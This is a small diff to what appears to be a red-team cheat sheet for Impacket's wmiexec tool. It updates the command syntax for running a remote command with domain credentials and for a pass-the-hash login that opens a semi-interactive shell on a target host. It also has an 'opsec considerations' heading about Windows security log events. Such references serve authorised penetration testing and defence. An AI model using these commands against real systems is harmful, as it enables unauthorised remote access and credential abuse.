@@ -2,10 +2,10 @@
 https://github.com/SecureAuthCorp/impacket/blob/master/examples/wmiexec.py
 
 # executes single command
-python wmiexec.py <domain>/<user>:<password>@<rhost> <command>
+impacket-wmiexec <domain>/<user>:<password>@<rhost> <command>
 
-# use hashes and launch semi interactive shell
-python wmiexec.py -hashes :<:ntlmHash> <domain>/<user>@<rhost> 
+# use hashes and launch semi interactive powershell
+impacket-wmiexec -hashes :<ntlmHash> <domain>/<user>@<rhost>
 
 # opsec considerations
 # Windows Security Log Event IDs
